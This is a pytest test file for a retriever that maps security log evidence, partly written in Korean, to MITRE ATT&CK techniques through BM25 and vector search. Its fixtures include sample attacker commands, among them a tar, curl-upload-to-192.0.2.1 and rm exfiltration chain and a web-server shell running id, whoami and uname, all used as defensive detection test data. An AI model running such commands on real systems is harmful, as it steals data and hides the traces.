"""Offline B contracts. Synthetic catalogs/vectors do not measure real Recall@10."""
from __future__ import annotations

import builtins
from copy import deepcopy
import json
import math
import subprocess
import sys
from types import SimpleNamespace

import pytest

from attack_mapping.retrieve import (
    HybridRetriever, RetrievalError, SentenceTransformerEmbedder,
    build_bm25_index, build_mapping_unit, build_search_query, build_vector_index,
    retrieve_bm25, retrieve_candidates, retrieve_vector, rrf_merge,
)


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def blocked(*args, **kwargs):
        raise AssertionError("B offline tests must not use the network")
    monkeypatch.setattr("socket.socket.connect", blocked)
    monkeypatch.setattr("socket.create_connection", blocked)


@pytest.fixture
def evidence():
    return {"evidence_id": "EVID-003", "sequence": 3, "time": "2026-09-27T10:03:00Z",
            "layer": "audit", "event_type": "process_execution",
            "description": "www-data가 sh -c 'id;whoami;uname -a' 실행",
            "raw_refs": ["audit.log:321", "audit.log:325"], "empty_result_call": None}


def technique(tid, name, description, **kwargs):
    return {"technique_id": tid, "name": name, "description": description, **kwargs}


@pytest.fixture
def catalog():
    # These are invented test descriptions, not a substitute for the official catalog.
    return [
        technique("T1059.004", "Unix Shell", "Command interpreter runs Unix shell commands.",
                  tactics=[{"tactic_id": "TA0002", "tactic_name": "Execution"}],
                  parent_technique={"technique_id": "T1059", "technique_name": "Command and Scripting Interpreter"}),
        technique("T1033", "System Owner/User Discovery", "Identify the current user with id and whoami."),
        technique("T1082", "System Information Discovery", "Query operating system information using uname."),
        technique("T1110.001", "Password Guessing", "Repeated password guessing and failed SSH authentication."),
        technique("T1505.003", "Web Shell", "A web shell runs on a web server."),
        technique("T1098.004", "SSH Authorized Keys", "Account manipulation adds SSH authorized_keys."),
        technique("T1560.001", "Archive via Utility", "Archive collected data with tar gzip compression utilities."),
        technique("T1048.003", "Exfiltration Over Unencrypted Non-C2 Protocol", "Upload file outbound transfer using an alternative protocol."),
        technique("T1070.004", "File Deletion", "Indicator removal deletes a file with rm."),
        technique("T1041", "Exfiltration Over C2 Channel", "Transfer data over an existing command and control channel."),
        technique("T1001", "Historical Item", "Unix shell", revoked=True),
        technique("T1002", "Deprecated Item", "Unix shell", deprecated=True),
    ]


class FakeEmbedder:
    """Explicit, non-semantic vector provider for numeric/contract tests."""
    def __init__(self, document_vectors=None, query_vector=None):
        self.cache_identity = {"model": "test-only-vectors", "revision": "fixture-1"}
        self.document_vectors = document_vectors
        self.query_vector = [1.0, 0.0] if query_vector is None else query_vector
        self.document_calls = []
        self.query_calls = []

    def encode_documents(self, texts):
        self.document_calls.append(list(texts))
        return self.document_vectors if self.document_vectors is not None else [[1.0, 0.5] for _ in texts]

    def encode_query(self, text):
        self.query_calls.append(text)
        return self.query_vector


@pytest.fixture
def manifest():
    return {"attack_version": "test-only", "sha256": "a" * 64,
            "retrieval_version": "2", "embedding_model": "test-only-vectors"}


def test_mapping_unit_preserves_evidence_and_does_not_alias_refs(evidence):
    before = deepcopy(evidence)
    unit = build_mapping_unit(evidence)
    assert unit["mapping_unit_id"] == "UNIT-EVID-003"
    for key in ("evidence_id", "sequence", "time", "layer", "event_type", "description", "raw_refs"):
        assert unit[key] == evidence[key]
    unit["raw_refs"].append("test.log:999")
    assert evidence == before


@pytest.mark.parametrize("patch", [
    {"raw_refs": []}, {"raw_refs": "audit.log:1"}, {"raw_refs": [None]},
    {"evidence_id": ""}, {"sequence": True}, {"sequence": 0},
    {"description": None}, {"time": 4}, {"empty_result_call": 4},
])
def test_bad_or_empty_result_evidence_rejected(evidence, patch):
    with pytest.raises(ValueError):
        build_mapping_unit({**evidence, **patch})


def test_mapping_unit_accepts_a_schema_optional_fields(evidence):
    unit = build_mapping_unit({**evidence, "sequence": None, "time": None,
                               "layer": "", "event_type": "", "description": "",
                               "raw_refs": tuple(evidence["raw_refs"])})
    assert unit["sequence"] is None and unit["time"] is None
    assert unit["layer"] == unit["event_type"] == unit["description"] == ""
    assert unit["raw_refs"] == evidence["raw_refs"]


def test_query_uses_observation_whitelist_and_keeps_commands(evidence):
    original = "tar -czf /tmp/a.tgz /srv/www; curl -T /tmp/a.tgz http://192.0.2.1/upload; rm -f /tmp/a.tgz"
    unit = build_mapping_unit({**evidence, "description": original})
    query = build_search_query({**unit, "attack_type": "DO_NOT_QUERY_ATTACK",
                                "final_verdict": {"attack_type": "NESTED_ATTACK"},
                                "confidence": 987654321, "severity": "DO_NOT_QUERY_SEVERITY",
                                "sigma_attack_tags": ["attack.t9999"]})
    assert original in query
    assert "archive collected data" in query and "upload file" in query and "file deletion" in query
    for forbidden in ("DO_NOT_QUERY", "NESTED_ATTACK", "987654321", "t9999", "audit.log:321"):
        assert forbidden not in query
    # curl -t is not upload, and must not receive the -T expansion.
    assert "upload file" not in build_search_query({**unit, "description": "curl -t /tmp/a"})


@pytest.mark.parametrize(("description", "term"), [
    ("SSH 비밀번호 추측", "password guessing"), ("웹셸 발견", "web shell"),
    ("sh -c id;whoami;uname -a", "unix shell"), ("authorized_keys 추가", "authorized keys"),
    ("XML-RPC 대량 POST", "web authentication"), ("사용자 확인", "user discovery"),
])
def test_korean_and_command_query_expansion(evidence, description, term):
    assert term in build_search_query({**evidence, "description": description})


def test_bm25_matches_hand_calculation_and_omits_zero_scores():
    docs = [technique("T1000", "alpha", "alpha beta"), technique("T1003", "beta", "gamma")]
    index = build_bm25_index(docs)
    hits = retrieve_bm25("alpha", index)
    expected = math.log(2) * (2 * 2.5) / (2 + 1.5 * (0.25 + 0.75 * 3 / 2.5))
    assert hits == [{"technique_id": "T1000", "score": pytest.approx(expected)}]
    assert retrieve_bm25("notincatalog", index) == []


def test_bm25_options_are_case_sensitive():
    index = build_bm25_index([technique("T1000", "Option A", "-T"), technique("T1003", "Option B", "-t")])
    assert [h["technique_id"] for h in retrieve_bm25("-T", index)] == ["T1000"]


def test_catalog_excludes_inactive_deduplicates_and_detects_conflicts(catalog):
    index = build_bm25_index(catalog + [deepcopy(catalog[0])])
    assert len(index.documents) == 10
    assert not {"T1001", "T1002"} & {d["technique_id"] for d in index.documents}
    with pytest.raises(ValueError, match="conflicting"):
        build_bm25_index(catalog + [{**catalog[0], "description": "different"}])
    with pytest.raises(ValueError, match="boolean"):
        build_bm25_index([{**catalog[0], "deprecated": "false"}])


def test_vector_normalizes_cosine_and_tie_breaks_by_id(manifest):
    docs = [technique("T1000", "a", "a"), technique("T1003", "b", "b"), technique("T1004", "c", "c")]
    backend = FakeEmbedder([[3, 0], [0, 10], [4, 0]], [5, 0])
    index = build_vector_index(docs, backend, manifest=manifest, cache_dir=None)
    hits = retrieve_vector("example", index, backend)
    assert [h["technique_id"] for h in hits] == ["T1000", "T1004", "T1003"]
    assert [h["score"] for h in hits] == pytest.approx([1, 1, 0])


def test_rrf_uses_ranks_not_scores_and_counts_duplicates_once():
    lexical = [{"technique_id": "T1000", "score": 1e10}, {"technique_id": "T1000"}, {"technique_id": "T1003"}]
    vector = [{"technique_id": "T1003", "score": -999}, {"technique_id": "T1004", "score": 999}]
    hits = rrf_merge(lexical, vector, k=60)
    assert [h["technique_id"] for h in hits] == ["T1003", "T1000", "T1004"]
    assert hits[0]["rrf_score"] == pytest.approx(1 / 62 + 1 / 61)
    assert hits[0]["sources"] == ["bm25", "vector"]
    assert hits[0]["retrieval_ranks"] == {"bm25": 2, "vector": 1}
    assert hits[1]["rrf_score"] == pytest.approx(1 / 61)
    assert [h["rank"] for h in hits] == [1, 2, 3]


def test_default_rrf_keeps_strong_single_source_hits_amid_midrank_overlap():
    common = [{"technique_id": f"T{4000 + i}"} for i in range(20)]
    lexical = [{"technique_id": f"T{2000 + i}"} for i in range(14)] + common
    semantic = [{"technique_id": f"T{3000 + i}"} for i in range(14)] + list(reversed(common))
    ids = {hit["technique_id"] for hit in rrf_merge(lexical, semantic)}
    assert {"T2000", "T3000"} <= ids


@pytest.mark.parametrize("limit", [0, -1, 11, True, 1.5])
def test_rrf_invalid_candidate_limit(limit):
    with pytest.raises(ValueError, match="limit"):
        rrf_merge([], [], limit=limit)


def test_hybrid_limits_returns_official_metadata_and_isolates_units(catalog, evidence, manifest):
    backend = FakeEmbedder()
    before = deepcopy(catalog)
    catalog += [technique(f"T{2000 + i}", "Unrelated", "synthetic unrelated record") for i in range(20)]
    retriever = HybridRetriever(iter(catalog), embedder=backend, manifest=manifest, cache_dir=None)
    hits = retriever.retrieve_candidates(build_mapping_unit(evidence))
    assert len(hits) == 10 == len({h["technique_id"] for h in hits})
    shell = next(h for h in hits if h["technique_id"] == "T1059.004")
    assert shell["name"] == before[0]["name"]
    assert shell["parent_technique"] == before[0]["parent_technique"]
    assert shell["tactics"] == before[0]["tactics"]
    shell["tactics"][0]["tactic_name"] = "changed outside"
    again = retriever.retrieve_candidates(evidence)
    assert next(h for h in again if h["technique_id"] == "T1059.004")["tactics"] == before[0]["tactics"]
    other = {**evidence, "evidence_id": "EVID-004", "description": "SSH 반복 비밀번호 실패"}
    retriever.retrieve_candidates(other)
    assert backend.query_calls[-1] != backend.query_calls[0]
    assert "whoami" not in backend.query_calls[-1]
    assert len(backend.document_calls) == 1


def test_hybrid_keeps_semantic_candidates_with_no_lexical_hit(evidence, manifest):
    docs = [technique("T1000", "zzzz", "xxxx"), technique("T1003", "qqqq", "yyyy")]
    backend = FakeEmbedder([[0, 1], [1, 0]], [1, 0])
    hits = retrieve_candidates(evidence, docs, embedder=backend, manifest=manifest, cache_dir=None)
    assert [h["technique_id"] for h in hits] == ["T1003", "T1000"]
    assert all(h["sources"] == ["vector"] for h in hits)


def test_offline_synthetic_scenarios_cover_query_recall(catalog, evidence):
    # This checks lexical vocabulary in a synthetic catalog, not real hybrid Recall@10.
    index = build_bm25_index(catalog)
    scenarios = [
        ("SSH 반복 비밀번호 실패", "T1110.001"), ("웹셸 설치", "T1505.003"),
        ("www-data가 sh -c 실행", "T1059.004"), ("authorized_keys 추가", "T1098.004"),
        ("tar -czf /tmp/a.tgz /srv", "T1560.001"),
        ("curl -T /tmp/a.tgz http://192.0.2.1/upload", "T1048.003"),
        ("rm -f /tmp/a.tgz 흔적 삭제", "T1070.004"),
        ("whoami / id", "T1033"), ("uname -a", "T1082"),
    ]
    for description, expected in scenarios:
        query = build_search_query({**evidence, "description": description})
        assert expected in {h["technique_id"] for h in retrieve_bm25(query, index, limit=10)}


def test_cache_reuses_vectors_order_independently_and_stores_no_evidence(catalog, evidence, manifest, tmp_path):
    backend = FakeEmbedder()
    first = HybridRetriever(catalog, embedder=backend, manifest=manifest, cache_dir=tmp_path)
    first.retrieve_candidates(evidence)
    second = HybridRetriever(reversed(catalog), embedder=backend, manifest=manifest, cache_dir=tmp_path)
    assert second.vector_index.cache_hit
    assert len(backend.document_calls) == 1
    payload = next(tmp_path.glob("*.json")).read_text(encoding="utf-8")
    assert "EVID-003" not in payload and "audit.log:321" not in payload
    assert evidence["description"] not in payload
    assert not list(tmp_path.glob("*.tmp"))


@pytest.mark.parametrize("change", ["sha256", "attack_version", "retrieval_version", "model", "revision", "text"])
def test_cache_invalidates_data_and_model_changes(catalog, manifest, tmp_path, change):
    backend = FakeEmbedder()
    original_manifest = deepcopy(manifest)
    build_vector_index(catalog, backend, manifest=manifest, cache_dir=tmp_path)
    updated_manifest = deepcopy(manifest)
    if change in ("sha256", "attack_version", "retrieval_version"):
        updated_manifest[change] = "b" * 64 if change == "sha256" else "changed"
    elif change == "model":
        backend.cache_identity["model"] = updated_manifest["embedding_model"] = "different-model"
    elif change == "revision":
        backend.cache_identity["revision"] = "fixture-2"
    else:
        catalog[0]["description"] += " New official text."
    index = build_vector_index(catalog, backend, manifest=updated_manifest, cache_dir=tmp_path)
    assert not index.cache_hit and len(backend.document_calls) == 2
    assert manifest == original_manifest


@pytest.mark.parametrize("damage", ["json", "checksum", "row_count", "dimension", "nan", "ids", "metadata"])
def test_corrupt_cache_is_rebuilt(catalog, manifest, tmp_path, damage):
    backend = FakeEmbedder()
    build_vector_index(catalog, backend, manifest=manifest, cache_dir=tmp_path)
    path = next(tmp_path.glob("*.json"))
    payload = json.loads(path.read_text(encoding="utf-8"))
    if damage == "json":
        path.write_text("incomplete {", encoding="utf-8")
    else:
        if damage == "checksum":
            payload["vectors"][0][0] += 0.1
        elif damage == "row_count":
            payload["vectors"] = []
        elif damage == "dimension":
            payload["dimension"] += 1
        elif damage == "nan":
            payload["vectors"][0][0] = float("nan")
        elif damage == "ids":
            payload["technique_ids"].reverse()
        else:
            payload["metadata"]["catalog_sha256"] = "wrong"
        path.write_text(json.dumps(payload), encoding="utf-8")
    rebuilt = build_vector_index(catalog, backend, manifest=manifest, cache_dir=tmp_path)
    assert not rebuilt.cache_hit and len(backend.document_calls) == 2


@pytest.mark.parametrize("rows", [[], [[0, 0]], [[math.nan, 1]], [[math.inf, 1]], [["1", 2]], [[True, 1]]])
def test_bad_document_vectors_are_not_successful_retrieval(rows, manifest):
    with pytest.raises(RetrievalError, match="Invalid embedding"):
        build_vector_index([technique("T1000", "a", "a")], FakeEmbedder(rows), manifest=manifest, cache_dir=None)


def test_query_dimension_and_backend_identity_must_match(catalog, manifest):
    backend = FakeEmbedder(query_vector=[1, 2, 3])
    index = build_vector_index(catalog, backend, manifest=manifest, cache_dir=None)
    with pytest.raises(RetrievalError, match="dimension"):
        retrieve_vector("query", index, backend)
    backend.cache_identity["revision"] = "different"
    with pytest.raises(ValueError, match="does not match"):
        retrieve_vector("query", index, backend)


def test_embedding_failures_are_not_bm25_fallback(catalog, evidence, manifest):
    backend = FakeEmbedder()
    retriever = HybridRetriever(catalog, embedder=backend, manifest=manifest, cache_dir=None)
    def failed(*args):
        raise RuntimeError("model unavailable")
    backend.encode_query = failed
    with pytest.raises(RetrievalError, match="Query embedding failed"):
        retriever.retrieve_candidates(evidence)
    backend.encode_documents = failed
    with pytest.raises(RetrievalError, match="Document embedding failed"):
        build_vector_index(catalog, backend, manifest=manifest, cache_dir=None)


def test_cache_io_failure_is_visible(catalog, manifest, tmp_path):
    file_path = tmp_path / "not-a-directory"
    file_path.write_text("existing", encoding="utf-8")
    with pytest.raises(RetrievalError, match="cache"):
        build_vector_index(catalog, FakeEmbedder(), manifest=manifest, cache_dir=file_path)
    assert file_path.read_text(encoding="utf-8") == "existing"


def test_empty_catalog_does_not_call_embedder(evidence, manifest):
    backend = FakeEmbedder()
    retriever = HybridRetriever([], embedder=backend, manifest=manifest, cache_dir=None)
    assert retriever.retrieve_candidates(evidence) == []
    assert backend.document_calls == backend.query_calls == []


def test_manifest_mismatch_and_invalid_unit_fail_before_model_calls(catalog, evidence, manifest):
    backend = FakeEmbedder()
    with pytest.raises(ValueError, match="embedding_model"):
        build_vector_index(catalog, backend, manifest={**manifest, "embedding_model": "wrong"}, cache_dir=None)
    with pytest.raises(ValueError, match="raw_refs"):
        retrieve_candidates({**evidence, "raw_refs": []}, catalog, embedder=backend, manifest=manifest, cache_dir=None)
    assert backend.document_calls == []


def test_adapter_loads_lazily_and_uses_pinned_local_model_and_e5_prefixes(monkeypatch):
    loaded, encoded = [], []
    class Model:
        def __init__(self, *args, **kwargs):
            loaded.append((args, kwargs))
        def encode(self, texts, **kwargs):
            encoded.append((texts, kwargs, self.max_seq_length))
            return SimpleNamespace(tolist=lambda: [[1, 0] for _ in texts])
    monkeypatch.setitem(sys.modules, "sentence_transformers", SimpleNamespace(SentenceTransformer=Model))
    backend = SentenceTransformerEmbedder(revision="a" * 40)
    assert loaded == []
    backend.encode_documents(["official description"])
    backend.encode_query("한국어 관측")
    assert len(loaded) == 1
    assert loaded[0][1]["revision"] == "a" * 40
    assert loaded[0][1]["local_files_only"] is True
    assert loaded[0][1]["trust_remote_code"] is False
    assert encoded[0][0] == ["passage: official description"]
    assert encoded[1][0] == ["query: 한국어 관측"]
    assert encoded[1][1]["normalize_embeddings"] is True
    assert encoded[1][1]["prompt"] == ""
    assert encoded[1][2] == 512
    backend.max_sequence_length = 128
    with pytest.raises(RetrievalError, match="configuration changed"):
        backend.encode_documents(["cannot label an old model with a new configuration"])


def test_adapter_rejects_mutable_revision_and_reports_missing_optional_dependency(monkeypatch):
    with pytest.raises(ValueError, match="pinned"):
        SentenceTransformerEmbedder(revision="main")
    original_import = builtins.__import__
    def guarded(name, *args, **kwargs):
        if name == "sentence_transformers":
            raise ImportError("not installed")
        return original_import(name, *args, **kwargs)
    monkeypatch.setattr(builtins, "__import__", guarded)
    with pytest.raises(RetrievalError, match="requirements-retrieval"):
        SentenceTransformerEmbedder(revision="a" * 40).encode_query("query")


def test_import_does_not_load_model_agent_or_rule_baseline():
    # Fresh interpreter: imports from other test modules cannot mask eager loading.
    code = """
import builtins
original = builtins.__import__
def guarded(name, *args, **kwargs):
    if (name.split('.')[0] in {'sentence_transformers', 'torch', 'transformers', 'agent'}
            or name in {'attack_mapping.engine', 'attack_mapping.matching', 'attack_mapping.rules'}):
        raise AssertionError('unexpected import: ' + name)
    return original(name, *args, **kwargs)
builtins.__import__ = guarded
import attack_mapping.retrieve
"""
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
